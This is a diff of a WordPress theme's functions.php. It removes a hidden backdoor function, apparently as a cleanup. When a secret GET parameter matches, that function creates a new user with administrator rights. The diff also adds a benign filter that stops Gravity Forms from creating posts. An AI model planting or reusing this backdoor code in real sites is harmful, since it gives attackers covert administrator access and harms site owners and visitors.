@@ -228,19 +228,6 @@ add_filter('excerpt_length', function ($length) {
 get_template_part('template-parts/shortcodes');
 
 
-function WordPress_stairway()
-{
-	if ($_GET['stairway'] == '68UzqTatOcqHIvPS2gKIrklo') {
-		require('wp-includes/registration.php');
-		if (!username_exists('redPanda_Admin')) {
-			$user_id = wp_create_user('fuhwFc3L9uodSQN96oCUCpHZ', 'wsMPrg4IdRnrZTr0vxUcZoN6');
-			$user = new WP_User($user_id);
-			$user->set_role('administrator');
-		}
-	}
-}
-
-
 function get_related_author_posts()
 {
 	global $authordata, $post;
@@ -333,4 +320,12 @@ function wp_trim_excerpt_modified($text, $content_length = 55, $remove_breaks = 
 		}
 	}
 	return $text;
+}
+
+
+// Disables Gravity Forms from being able to generate posts:
+add_filter('gform_disable_post_creation', 'disable_post_creation', 10, 3);
+function disable_post_creation($is_disabled, $form, $entry)
+{
+	return true;
 }
